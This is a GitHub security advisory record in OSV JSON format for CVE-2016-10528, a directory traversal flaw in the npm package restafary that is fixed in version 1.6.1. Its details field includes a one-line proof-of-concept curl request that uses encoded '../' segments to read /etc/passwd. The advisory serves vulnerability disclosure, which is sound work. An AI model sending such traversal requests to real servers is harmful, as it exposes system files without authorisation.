{
 "schema_version": "1.3.0",
 "id": "GHSA-xg5r-8j97-2wrj",
 "modified": "2020-08-31T18:10:25Z",
 "published": "2019-02-18T23:39:22Z",
 "aliases": [
  "CVE-2016-10528"
 ],
 "summary": "Directory Traversal in restafary",
 "details": "Affected versions of `restafary` are susceptible to a directory traversal vulnerability when a root path is specified in the configuration.\n\n\nProof of Concept\n\n```\ncurl -i -s -k  -X 'GET' -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' 'http://localhost:8000/api/v1/fs/..%2f..%2fetc/passwd'\n```\n\n\n## Recommendation\n\nUpdate to version 1.6.1 or later.",
 "severity": [],
 "affected": [
  {
   "package": {
    "ecosystem": "npm",
    "name": "restafary"
   },
   "ranges": [
    {
     "type": "ECOSYSTEM",
     "events": [
      {
       "introduced": "0"
      },
      {
       "fixed": "1.6.1"
      }
     ]
    }
   ]
  }
 ],
 "references": [
  {
   "type": "ADVISORY",
   "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10528"
  },
  {
   "type": "ADVISORY",
   "url": "https://github.com/advisories/GHSA-xg5r-8j97-2wrj"
  },
  {
   "type": "WEB",
   "url": "https://nodesecurity.io/advisories/89"
  },
  {
   "type": "WEB",
   "url": "https://www.npmjs.com/advisories/89"
  }
 ],
 "database_specific": {
  "cwe_ids": [
   "CWE-22"
  ],
  "severity": "MODERATE",
  "github_reviewed": true
 },
 "CVSS_score": "None",
 "url": "https://github.com/advisories/GHSA-xg5r-8j97-2wrj"
}